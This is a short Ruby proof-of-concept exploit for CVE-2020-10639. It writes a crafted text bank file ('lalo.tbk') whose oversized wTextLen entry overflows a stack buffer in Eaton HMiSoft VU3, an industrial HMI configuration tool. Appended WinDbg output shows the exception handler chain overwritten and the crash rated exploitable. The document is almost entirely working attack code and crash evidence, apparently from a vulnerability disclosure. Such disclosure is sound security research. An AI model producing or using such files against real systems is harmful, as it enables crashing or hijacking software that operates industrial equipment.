#!/usr/bin/env ruby
# CVE-2020-10639
# Eaton HMiSoft VU3 File Parsing wTextLen Stack-based Buffer Overflow 
# Tested against HMiSoft_3_00_21. Options/Text Bank/Open 
  
require 'rex'

text = Rex::Text.to_unicode("A" * 9024) + "\x00" * 2

data =  "[TextBank]\r\n"
data << "wFont001=Arial\r\n"
data << "wTextLen001-000=#{text.size}\r\n"
data << text + "\r\n"

fd = File.new("lalo.tbk","wb")
fd.write(data)
fd.close

__END__
0:000> !exchain
0012f31c: HMiSoft+10041 (00410041)
Invalid exception stack at 00410041
0:000> !exploitable 
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - User Mode Write AV starting at msvcrt!memcpy+0x0000000000000250 (Hash=0x1c560861.0x75331a27)

User mode write access violations that are not near NULL are exploitable.

